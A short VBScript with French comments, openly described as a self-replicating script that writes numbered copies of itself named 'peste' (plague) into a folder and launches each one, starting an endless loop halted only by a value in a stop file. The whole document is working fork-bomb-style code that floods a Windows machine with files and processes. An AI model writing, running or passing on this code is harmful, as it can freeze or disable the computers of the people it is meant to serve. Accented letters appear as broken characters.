'	Script qui cr�e un fichier qui lui est aussi script qui est exactement le 
'	meme que celui-ci et est lanc� a la fin, cr�ant ainis une bocle infinie
'	Le fichier sera nomm�e selon un chiffre qui incr�mente a chaque nouveau lancement


Option Explicit
Dim objFSO, chiffre, objFile, MonShell, writeFile, parts, fileName, chemin, scriptDir, starter, stopScript, stopper, stopTxt

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set MonShell = WScript.CreateObject("WScript.Shell")


Set starter = objFSO.OpenTextFile("Composants/stop.txt", 2)
starter.Write ("0")
starter.Close


' R�cuperation du nom du dossier parent
scriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

' D�claration de chiffre en dehors de la boucle
chiffre = 0

stopScript = False
' Cr�ation du script qui relancera le meme code
Do While Not stopScript

	chemin = scriptDir & "\Peste\peste" & chiffre & ".vbs"
	
	Set objFile = objFSO.CreateTextFile(chemin)
	Set writeFile = objFSO.OpenTextFile("./Composants/script.txt", 1)

	Do Until writeFile.AtEndOfStream
		objFile.WriteLine (writeFile.ReadLine)
	Loop

	objFile.Close
	writeFile.Close

	WScript.Sleep 100
	MonShell.Run chemin
	chiffre = chiffre + 1
	
	Set stopper = objFSO.OpenTextFile("./Composants/stop.txt", 1)
	stopTxt = stopper.ReadLine
	stopper.Close
	if stopTxt = 1 Then stopScript = True
	
Loop